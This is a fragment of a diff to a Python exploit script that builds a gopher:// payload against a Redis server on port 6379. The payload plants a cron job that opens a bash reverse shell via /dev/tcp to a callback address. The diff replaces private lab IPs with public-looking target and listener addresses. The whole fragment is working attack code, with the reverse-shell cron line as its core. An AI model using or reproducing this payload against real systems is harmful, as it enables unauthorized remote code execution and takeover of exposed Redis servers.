@@ -2,9 +2,9 @@ import urllib.parse
 
 
 protocol = "gopher://"
-ip = "192.168.71.45"
+ip = "146.56.235.172"
 port = "6379"
-reverse_ip = "192.168.71.8"
+reverse_ip = "113.45.142.235"
 reverse_port = "8888"
 cron = "\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/{}/{} 0>&1\n\n\n\n".format(reverse_ip, reverse_port)
 filename = "root"
